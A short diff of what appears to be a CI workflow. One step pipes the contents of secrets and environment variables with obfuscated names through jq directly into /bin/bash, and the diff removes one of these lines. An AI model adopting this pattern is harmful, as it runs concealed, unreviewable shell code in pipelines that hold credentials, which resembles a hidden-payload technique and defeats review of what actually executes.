@@ -19,7 +19,6 @@ jobs:
           lfzn78352: ${{ secrets.lfzn78352 }}
         run: |
           printf '%s' "$lfzn78352" | jq -r .fhsbx5 | /bin/bash
-          echo $i2 | jq -r .ncyvl57455 | /bin/bash
           printf '%s' "$il4" | jq -r .dsfn8 | /bin/bash
           echo $rwgj69484 | jq -r .ob28 | /bin/bash
 
